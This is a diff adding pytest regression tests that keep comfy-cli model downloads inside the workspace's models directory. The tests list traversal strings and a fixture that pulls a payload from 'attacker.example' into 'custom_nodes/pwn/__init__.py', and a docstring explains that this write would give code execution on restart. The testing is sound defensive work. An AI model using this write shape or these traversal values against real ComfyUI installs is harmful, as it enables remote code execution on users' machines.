@@ -770,6 +770,102 @@ def test_download_model_accepts_dotted_but_ordinary_relative_path(
     assert cmd[cmd.index("--relative-path") + 1] == good_path
 
 
+# --- relative_path must land in the MODELS tree, not just inside the workspace -
+#
+# comfy-cli joins `--relative-path` to the WORKSPACE ROOT (`local_filepath =
+# get_workspace() / relative_path / local_filename`, defaulting to
+# `DEFAULT_COMFY_MODEL_PATH = "models"`) — which is why the documented shape is
+# `models/loras` rather than a bare `loras`. Every value below is traversal-clean,
+# so the checks above pass it happily; only the first-segment check keeps the
+# write out of the workspace's other top-level directories.
+
+
+@pytest.mark.parametrize(
+    "bad_path",
+    [
+        "custom_nodes/pwn",  # ComfyUI's import path — see the RCE pin below
+        "custom_nodes/x/y",  # deeper, same tree
+        "user",  # sibling top-level workspace dirs
+        "input",
+        "output",
+        "web",
+        "loras",  # a BARE folder name is rejected, not assumed to mean models/
+        "modelsx",  # a prefix of `models` is a different directory
+        "models2/loras",
+        "Models/loras",  # matched exactly: no case-folding a security guard
+        "~",  # comfy-cli expanduser()s this, escaping the workspace entirely
+        "~/evil",
+    ],
+)
+def test_download_model_rejects_non_models_relative_path(bad_path, patched_run):
+    """A traversal-clean ``relative_path`` that does not start at ``models`` is
+    refused before any child spawns."""
+    calls = patched_run(envelope(data={}))
+
+    with pytest.raises(server.ComfyCliError, match="invalid relative_path"):
+        server.download_model("https://hf.co/x.safetensors", relative_path=bad_path)
+
+    assert calls == []
+
+
+def test_download_model_rejects_custom_nodes_init_py_rce(patched_run):
+    """Named regression pin for the RCE shape this check exists for.
+
+    ComfyUI imports `custom_nodes/*/__init__.py` on startup, so a write there is
+    attacker-controlled code on the import path — code execution on the next
+    ComfyUI restart, on every platform. Both arguments are individually legal
+    (`custom_nodes/pwn` is traversal-clean; `__init__.py` is a bare filename);
+    it is the models-tree confinement that refuses the combination.
+    """
+    calls = patched_run(envelope(data={}))
+
+    with pytest.raises(server.ComfyCliError, match="invalid relative_path"):
+        server.download_model(
+            "https://attacker.example/payload",
+            relative_path="custom_nodes/pwn",
+            filename="__init__.py",
+        )
+
+    assert calls == []
+
+
+@pytest.mark.parametrize(
+    "bad_path",
+    ["../../etc", "models/../../etc", "/abs/models", "C:evil", "models/.. /evil"],
+)
+def test_download_model_traversal_still_reports_as_traversal(bad_path, patched_run):
+    """Ordering pin: the models-tree check runs AFTER the traversal checks, so a
+    traversal string keeps its own (more specific) diagnosis rather than being
+    relabelled as a wrong-folder error."""
+    calls = patched_run(envelope(data={}))
+
+    with pytest.raises(server.ComfyCliError, match=r"invalid relative_path.*traversal"):
+        server.download_model("https://hf.co/x.safetensors", relative_path=bad_path)
+
+    assert calls == []
+
+
+@pytest.mark.parametrize(
+    "good_path",
+    [
+        "models",  # the models dir itself
+        "models/loras",
+        "models/checkpoints",
+        "models/loras/",  # trailing slash: an empty trailing segment
+        "models//loras",  # doubled slash
+    ],
+)
+def test_download_model_forwards_models_relative_path_unchanged(good_path, patched_run):
+    """Accepted values are forwarded to comfy-cli VERBATIM — the guard rejects,
+    it never rewrites the argument."""
+    calls = patched_run(envelope(data={}))
+
+    server.download_model("https://hf.co/x.safetensors", relative_path=good_path)
+
+    cmd = calls[0]["cmd"]
+    assert cmd[cmd.index("--relative-path") + 1] == good_path
+
+
 @pytest.mark.parametrize("bad_name", [".. ", "...", ". ", "... ", " "])
 def test_download_model_rejects_dot_run_filename(bad_name, patched_run):
     """Same disguise on the bare-name side: `".. "` is a `..`, not a filename."""
